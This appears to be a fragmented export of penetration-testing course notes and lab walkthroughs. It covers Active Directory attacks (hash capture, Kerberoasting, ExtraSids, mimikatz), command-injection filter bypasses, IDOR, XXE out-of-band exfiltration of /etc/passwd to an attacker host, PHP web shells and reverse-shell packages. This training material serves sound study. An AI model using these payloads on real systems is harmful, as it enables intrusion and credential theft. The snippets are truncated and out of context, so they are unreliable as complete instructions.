## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-inveigh-and-capture-the-ntlmv2-hash-for-the-svc_qualys-account-cra-3
#cat/UTILS #cpts
Students then need to copy the hash into their clipboard, because, they need to save it to into a file inside of `Pwnbox`/`PMVPN`:

```
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys" | Clip
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-inveigh-and-capture-the-ntlmv2-hash-for-the-svc_qualys-account-cra-5
#cat/UTILS #cpts
However, students will notice that there are new line characters in the hash (and if supplied to `Hashcat` as is, it won't work), to remove them, `Perl` can be used:

```
perl -p -i -e 's/\R//g;' svc_qualysCapturedHash.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-ad-user-has-a-rid-equal-to-decimal-1170
#cat/UTILS #cpts
Then, students need to use `queryuser` on the AD user whose `RID` is `1170`; students will find out that the user name is of the AD user whose `RID` is `1170` is `mmorgan`:

```
queryuser 1170
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-snaffler-and-hunt-for-a-readable-web-config-file-what-is-the-name-
#cat/UTILS #cpts
Using the same `xfreerdp` connection established in question 1 of this section, students need to go back to the privileged `PowerShell` shell, exit `BloodHound`, navigate back to `C:\Tools\`, and then run `Snaffler`:

```
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v -data
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - run-snaffler-and-hunt-for-a-readable-web-config-file-what-is-the-name--2
#cat/UTILS #cpts
```
2022-06-19 07:36:17 -07:00
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-hosts-security-configuration-information-and-provide-its
#cat/UTILS #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Ad

```
Get-MpComputerStatus
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerate-the-hosts-security-configuration-information-and-provide-its-2
#cat/UTILS #cpts
```
AMEngineVersion : 0.0.0.0
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-name-of-the-service-account-with-the-spn-vmwareinlanefreig
#cat/UTILS #cpts
When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run PowerShell as Admi

```
setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-name-of-the-service-account-with-the-spn-vmwareinlanefreig-2
#cat/UTILS #cpts
```
CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - crack-the-password-for-this-account-and-submit-it-as-your-answer
#cat/UTILS #cpts
Using the same `xfreerdp` session from the previous question, students need to navigate to `C:\Tools\` from within `PowerShell`:

```
cd C:\Tools\
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-the-skills-learned-in-this-section-enumerate-the-activedirectory
#cat/UTILS #cpts
Students then need to use `Convert-NameToSid` on `forend`:

```
$sid = Convert-NameToSid forend
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-the-skills-learned-in-this-section-enumerate-the-activedirectory-2
#cat/UTILS #cpts
Now, students need to enumerate the domain for objects that `forend` has rights over; students will find out that the `ActiveDirectoryRights` the user `forend` has over the user `dpayne` is `GenericAll`:

```
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-the-skills-learned-in-this-section-enumerate-the-activedirectory-3
#cat/UTILS #cpts
```
ObjectDN : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-objectacetype-of-the-first-right-that-the-forend-user-has-
#cat/UTILS #cpts
Using the same `xfreerdp` session from the previous question, students need to use the `Get-DomainObjectAcl` Cmdlet; students will find out that `ObjectAceType` of the first right that `forend` has over the GPO Managemen

```
Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_.SecurityIdentifier -eq $sid}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - apply-what-was-taught-in-this-section-to-gain-a-shell-on-dc01-submit-t
#cat/UTILS #cpts
At last, students need to print out the contents of the flag at `C:\Administrator\Desktop\DailyTasks\flag.txt`:

```
type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - apply-what-was-taught-in-this-section-to-gain-a-shell-on-dc01-submit-t-2
#cat/UTILS #cpts
```
cmd-session
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-child-domain-of-inlanefreightlocal-format-fqdn-ie-devacmel
#cat/UTILS #cpts
Students then need to run `Get-DomainTrustMapping`:

```
Get-DomainTrustMapping
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-sid-of-the-enterprise-admins-group-in-the-root-domain
#cat/UTILS #cpts
Using the same `xfreerdp` connection established in the the previous question, students need to use `Get-DomainObject` to get the `SID` of the Enterprise Admins group in the root domain:

```
Get-DomainObject -Identity "Enterprise Admins" -Domain INLANEFREIGHT.LOCAL | select samaccountname,objectsid
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-sid-of-the-enterprise-admins-group-in-the-root-domain-2
#cat/UTILS #cpts
```
samaccountname objectsid
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - perform-the-extrasids-attack-to-compromise-the-parent-domain-submit-th
#cat/UTILS #cpts
Students then need to print out the contents of the flag:

```
cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - log-in-to-the-academy-ea-dc03freightlogisticslocal-domain-controller-u
#cat/UTILS #cpts
Students first need to use `smbexec` to log in to `ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL`, utilizing the credentials `sapsso:pabloPICASSO`:

```
smbexec.py freightlogistics/sapsso@freightlogistics.local
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - log-in-to-the-academy-ea-dc03freightlogisticslocal-domain-controller-u-2
#cat/UTILS #cpts
At last, students need to print out the contents of the flag file "flag.txt" at `C:\users\administrator\desktop\flag.txt`:

```
type C:\users\administrator\desktop\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - log-in-to-the-academy-ea-dc03freightlogisticslocal-domain-controller-u-3
#cat/UTILS #cpts
```
C:\Windows\system32>type C:\users\administrator\desktop\flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kerberoast-an-account-with-the-spn-mssqlsvcsql01inlanefreightlocal1433-7
#cat/UTILS #cpts
```
meterpreter > ps
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-18
#cat/UTILS #cpts
```
meterpreter > run autoroute -s 172.16.6.0/24
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-19
#cat/UTILS #cpts
```
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-20
#cat/UTILS #cpts
```
[ProxyList]
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-cflagtxt-file-on-ms01
#cat/UTILS #cpts
Then, students will find three live hosts and note that `172.16.7.3` is the `INLANEFREIGHT.LOCAL` domain controller.

```
172.16.7.3
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-21
#cat/UTILS #cpts
Now, LSA passwords can be extracted using `mimikatz`'s `sekurlsa::logonpasswords`:

```
mimikatz64.exe
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - command-injection-detection
#cat/UTILS #cpts
When we visit the web application in the below exercise, we see a `Host Checker` utility that appears to ask us for an IP to check whether it is alive or not: <img width="822" height="326" src=":/2530e50b54f64c028411cf3e

```
ping -c 1 OUR_INPUT
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - and-operator
#cat/UTILS #cpts
We can start with the `AND` (`&&`) operator, such that our final payload would be (`127.0.0.1 && whoami`), and the final executed command would be the following:

```
ping -c 1 127.0.0.1 && whoami
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - or-operator
#cat/UTILS #cpts
Finally, let us try the `OR` (`||`) injection operator. The `OR` operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the ori

```
ping -c 1 127.0.0.1 | | whoami
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - or-operator-2
#cat/UTILS #cpts
This is because of how `bash` commands work. As the first command returns exit code `0` indicating successful execution, the `bash` command stops and does not try the other command. It would only attempt to execute the o

```
ping -c 1 | | whoami
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-brace-expansion
#cat/UTILS #cpts
There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:

```
{ls,-la}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-6
#cat/UTILS #cpts
There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (`or any other character`) is through `Linux Environment Variables` like we did with `${IFS}`.

```
echo ${PATH}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-7
#cat/UTILS #cpts
So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

```
echo ${PATH:0:1}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-8
#cat/UTILS #cpts
**Note:** When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character. We can do the same with the `$HOME` or `$PWD` environment variables as

```
echo ${LS_COLORS:10:1}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - character-shifting
#cat/UTILS #cpts
There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find th

```
echo $(tr '!-}' '"-~'<<<[)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - commands-blacklist
#cat/UTILS #cpts
We have so far successfully bypassed the character filter for the space and semi-colon characters in our payload. So, let us go back to our very first payload and re-add the `whoami` command to see if it gets executed: <

```
$blacklist = ['whoami', 'cat', ...SNIP...]
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - commands-blacklist-2
#cat/UTILS #cpts
We have so far successfully bypassed the character filter for the space and semi-colon characters in our payload. So, let us go back to our very first payload and re-add the `whoami` command to see if it gets executed: <

```
echo "Invalid input"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-only
#cat/UTILS #cpts
We can insert a few other Linux-only characters in the middle of commands, and the `bash` shell would ignore them and execute the command. These characters include the backslash `\` and the positional parameter character

```
who$@ami
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - case-manipulation-2
#cat/UTILS #cpts
However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we

```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - burp-post-request
#cat/UTILS #cpts
There are many other commands we may use for the same purpose, like the following:

```
$(a="WhOaMi";printf %s "${a,,}")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - reversed-commands
#cat/UTILS #cpts
Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing `imaohw` instead of `whoa

```
echo 'whoami' | rev
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - reversed-commands-2
#cat/UTILS #cpts
Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

```
$(rev<<<'imaohw')
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - burp-post-request-2
#cat/UTILS #cpts
Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command. The same can be applied in `Windows.` We can first reverse a

```
imaohw
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - burp-post-request-3
#cat/UTILS #cpts
Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like `sh` for comm

```
dwBoAG8AYQBtAGkA
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator
#cat/UTILS #cpts
Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:

```
cd ./bashfuscator/bin/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator-2
#cat/UTILS #cpts
Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:

```
./bashfuscator -h
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator-3
#cat/UTILS #cpts
Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:

```
l, --list List all the available obfuscators, compressors, and encoders
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator-4
#cat/UTILS #cpts
We can start by simply providing the command we want to obfuscate with the `-c` flag:

```
./bashfuscator -c 'cat /etc/passwd'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator-5
#cat/UTILS #cpts
We can start by simply providing the command we want to obfuscate with the `-c` flag:

```
${*/+27\[X\(} ...SNIP... ${*~}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator-6
#cat/UTILS #cpts
However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from

```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-bashfuscator-7
#cat/UTILS #cpts
We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:

```
bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - insecure-configuration
#cat/UTILS #cpts
HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including `Apache`, `Tomcat`, and `ASP.NET`. The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP ve

```
AuthType Basic
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - insecure-coding
#cat/UTILS #cpts
While identifying and patching insecure web server configurations is relatively easy, doing the same for insecure code is much more challenging. This is because to identify this vulnerability in the code, we need to find

```
echo "Malicious Request Denied!"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - insecure-parameters
#cat/UTILS #cpts
Let's start with a basic example that showcases a typical IDOR vulnerability. The exercise below is an `Employee Manager` web application that hosts employee records: http://SERVER_IP:PORT/ Our web application assumes th

```
/documents/Invoice_1_09_2021.pdf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - insecure-parameters-2
#cat/UTILS #cpts
We see that the files have a predictable naming pattern, as the file names appear to be using the user `uid` and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most

```
/documents/Invoice_2_08_2020.pdf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - bypassing-encoded-references
#cat/UTILS #cpts
Using a `download.php` script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks. In this case, the web application is not sending the direct r

```
echo -n 1 | md5sum
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - mass-enumeration
#cat/UTILS #cpts
With that, we can run the script, and it should download all contracts for employees 1-10:

```
ls -1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - object-level-access-control
#cat/UTILS #cpts
An Access Control system should be at the core of any web application since it can affect its entire design and structure. To properly control each area of the web application, its design has to support the segmentation

```
&& (user.uid == userId | | user.roles == 'admin')
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - object-referencing
#cat/UTILS #cpts
While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulne

```
$uid = intval($_REQUEST['uid'])
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - object-referencing-2
#cat/UTILS #cpts
While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulne

```
$query = "SELECT url FROM documents where uid=" . $uid
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - object-referencing-3
#cat/UTILS #cpts
While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulne

```
$result = mysqli_query($conn, $query)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - object-referencing-4
#cat/UTILS #cpts
While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulne

```
$row = mysqli_fetch_array($result)
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - remote-code-execution-with-xxe-2
#cat/UTILS #cpts
In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web appli

```
sudo python3 -m http.server 80
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - advanced-exfiltration-with-cdata
#cat/UTILS #cpts
So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as fol

```
echo '<entity_joined___begin__file__end>' > xxe.dtd
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - advanced-exfiltration-with-cdata-2
#cat/UTILS #cpts
So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as fol

```
python3 -m http.server 8000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - advanced-exfiltration-with-cdata-3
#cat/UTILS #cpts
```
Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - error-based-xxe
#cat/UTILS #cpts
```
The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - out-of-band-data-exfiltration
#cat/UTILS #cpts
So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:

```
vi index.php # here we
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - out-of-band-data-exfiltration-2
#cat/UTILS #cpts
Then, we can send our request to the web application: <img width="813" height="280" src=":/acae0de483064780b206f03e64943b16"/> Finally, we can go back to our terminal, and we will see that we did indeed get the request a

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - automated-oob-exfiltration
#cat/UTILS #cpts
Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=h

```
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - automated-oob-exfiltration-2
#cat/UTILS #cpts
We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we

```
cat Logs/10.129.201.94/etc/passwd.log
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - repeat-what-you-learned-in-this-section-to-get-a-list-of-documents-of-
#cat/UTILS #cpts
After saving the script into a file, students need to run it and provide `STMIP:STMPO` as the first command line argument:

```
bash script.sh STMIP:STMPO
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - repeat-what-you-learned-in-this-section-to-get-a-list-of-documents-of--2
#cat/UTILS #cpts
Once the script finishes executing, students will find the flag `HTB{4ll_f1l35_4r3_m1n3}` in the file `flag_11dfa168ac8eb2958e38425728623c98.txt`:

```
cat flag_11dfa168ac8eb2958e38425728623c98.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-download-the-contracts-of-the-first-20-employee-one-of-which-sh
#cat/UTILS #cpts
After running the script, students will have 20 PDF files downloaded, and to know which one of them contains the flag, students can use `ls` with the `-l` flag to notice that all of them are empty except `contract_98f137

```
ls -lAS contract_*
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-download-the-contracts-of-the-first-20-employee-one-of-which-sh-2
#cat/UTILS #cpts
```
└──╼ [★]$ ls -lAS contract_*
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-download-the-contracts-of-the-first-20-employee-one-of-which-sh-3
#cat/UTILS #cpts
Thus, students need to use `cat` on the PDF file to attain the flag `HTB{h45h1n6_1d5_w0n7_570p_m3}` :

```
cat contract_98f13708210194c475687be6106a3b84.pdf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-change-the-admins-email-to-flagidorhtbmailtoflagidorhtb-and-you
#cat/UTILS #cpts
Now that the students have attained the `uid` and `uuid` of an admin account, they need to go to the web root page of the spawned target machine, click on the "Edit Profile" button, then click on the "Update profile" but

```
"uid": "10"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-read-the-content-of-the-connectionphp-file-and-submit-the-value
#cat/UTILS #cpts
After spawning the target machine, students need to run `Burp Suite`, make sure that `FoxyProxy` is set to the preconfigured option "Burp (8080)" in Firefox, and then intercept the form request that contains dummy data:

```
email [
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - try-to-read-the-content-of-the-connectionphp-file-and-submit-the-value-2
#cat/UTILS #cpts
Because the email is being displayed back, students need to place the "company" entity reference in it as such:

```
&company
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - use-either-method-from-this-section-to-read-the-flag-at-flagphp-you-ma
#cat/UTILS #cpts
```
└──╼ [★]$ python3 -m http.server 8000
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-blind-data-exfiltration-on-the-blind-page-to-read-the-content-of
#cat/UTILS #cpts
After spawning the target machine, students first need to create the OOB DTD file on Pwnbox/`PMVPN`:

```
cat > XXE.dtd <<'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>/?x=%file;'>">
%eval;
%exfil;
EOF
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - using-eyewitness
#cat/UTILS #cpts
First up is EyeWitness. As mentioned before, EyeWitness can take the XML output from both Nmap and Nessus and create a report with screenshots of each web application present on the various ports using Selenium. It will

```
sudo apt install eyewitness
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - code-execution
#cat/UTILS #cpts
With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the `john` user, which will redirect us to the admin panel. Click on `Ap

```
system($_GET[0])
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - code-execution-2
#cat/UTILS #cpts
Once we are satisfied with the setup, we can type `exploit` and obtain a reverse shell. From here, we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation and lateral

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulnerable-plugins---mail-masta
#cat/UTILS #cpts
Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the year

```
$camp_id=$_POST['camp_id']
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulnerable-plugins---mail-masta-2
#cat/UTILS #cpts
Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the year

```
$masta_reports = $wpdb->prefix . "masta_reports"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulnerable-plugins---mail-masta-3
#cat/UTILS #cpts
Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the year

```
$count=$wpdb->get_results("SELECT count(*) co from $masta_reports where camp_id=$camp_id and status=1")
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - vulnerable-plugins---mail-masta-4
#cat/UTILS #cpts
Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the year

```
echo $count[0]->co
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - discoveryfootprinting
#cat/UTILS #cpts
A quick way to identify a WordPress site is by browsing to the `/robots.txt` file. A typical robots.txt on a WordPress installation may look like:

```
User-agent: *
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternative-installation-of-python27
#cat/UTILS #cpts
While not as valuable as droopescan, this tool can help us find accessible directories and files and may help with fingerprinting installed extensions. At this point, we know that we are dealing with Joomla `3.9.4`. The

```
Warning
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - alternative-installation-of-python27-2
#cat/UTILS #cpts
The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common passwo

```
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - uploading-a-backdoored-module
#cat/UTILS #cpts
Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```
RewriteEngine On
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - drupalgeddon3
#cat/UTILS #cpts
If successful, we will obtain a reverse shell on the target host.

```
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - abusing-built-in-functionality
#cat/UTILS #cpts
We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/rever

```
tree splunk_shell/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - abusing-built-in-functionality-2
#cat/UTILS #cpts
The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script eve

```
cat inputs.conf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - abusing-built-in-functionality-3
#cat/UTILS #cpts
Once the files are created, we can create a tarball or `.spl` file.

```
tar -cvzf updater.tar.gz splunk_shell/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - abusing-built-in-functionality-4
#cat/UTILS #cpts
In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to

```
import sys,socket,os,pty
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - username-enumeration
#cat/UTILS #cpts
Though not considered a vulnerability by GitLab as seen on their [Hackerone](https://hackerone.com/gitlab?type=team) page ("User and project enumeration/path disclosure unless an additional impact can be demonstrated"),

```
config.maximum_attempts = 10
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - username-enumeration-2
#cat/UTILS #cpts
Downloading the script and running it against the target GitLab instance, we see that there are two valid usernames, `root` (the built-in admin account) and `bob`. If we successfully pulled down a large list of users, we

```
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - trick
#cat/UTILS #cpts
Enemigosss:SuperGucciRainbowCake &nbsp; http://preprod-payroll.trick.htb/

```
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shellshock-via-cgi
#cat/UTILS #cpts
The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is define

```
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - retrieving-hardcoded-credentials-from-thick-client-applications
#cat/UTILS #cpts
